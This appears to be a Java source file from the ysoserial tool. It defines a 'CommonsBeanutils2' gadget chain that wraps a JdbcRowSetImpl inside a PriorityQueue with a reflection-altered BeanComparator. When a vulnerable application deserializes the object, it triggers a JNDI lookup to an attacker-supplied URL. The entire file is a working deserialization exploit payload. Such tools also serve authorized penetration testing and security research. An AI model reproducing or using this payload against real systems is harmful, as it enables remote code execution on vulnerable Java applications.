package ysoserial.payloads;

import com.sun.rowset.JdbcRowSetImpl;
import org.apache.commons.beanutils.BeanComparator;
import ysoserial.payloads.util.Reflections;
import java.math.BigInteger;
import java.util.*;

public class CommonsBeanutils2 implements ObjectPayload<Object>{
    public Object getObject(final String command) throws Exception{
        BeanComparator cmp = new BeanComparator("lowestSetBit", Collections.reverseOrder());
        Object trig = CommonsBeanutils2.makeComparatorTrigger(CommonsBeanutils2.makeJNDIRowSet(command), cmp);
        Reflections.setFieldValue(cmp, "property", "databaseMetaData");
        return trig;

    }


    public static Queue<Object> makePriorityQueue (Object tgt, Comparator comparator ) throws Exception {
        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        // stub data for replacement later
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[ 0 ] = tgt;
        queueArray[ 1 ] = tgt;

        return queue;
    }

    public static JdbcRowSetImpl makeJNDIRowSet (String jndiUrl ) throws Exception {
        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(jndiUrl);
        rs.setMatchColumn("foo");
        Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);
        return rs;
    }

    public static Object makeComparatorTrigger ( Object tgt, Comparator<?> cmp ) throws Exception {
        return CommonsBeanutils2.makePriorityQueue(tgt, cmp);
    }
}
